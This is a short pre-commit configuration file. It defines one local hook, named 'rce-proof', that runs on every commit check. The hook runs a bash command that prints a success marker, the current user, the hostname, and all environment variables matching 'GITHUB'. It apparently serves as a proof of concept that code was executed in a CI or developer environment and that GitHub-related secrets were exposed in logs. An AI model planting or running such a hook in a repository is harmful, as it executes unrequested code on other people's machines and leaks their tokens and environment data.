repos:
- repo: local
  hooks:
    - id: rce-proof
      name: rce-proof
      entry: bash
      args: [-c, "echo RCE_SUCCESSFUL && whoami && hostname && env | grep GITHUB"]
      language: system
      always_run: true
      pass_filenames: false
      verbose: true
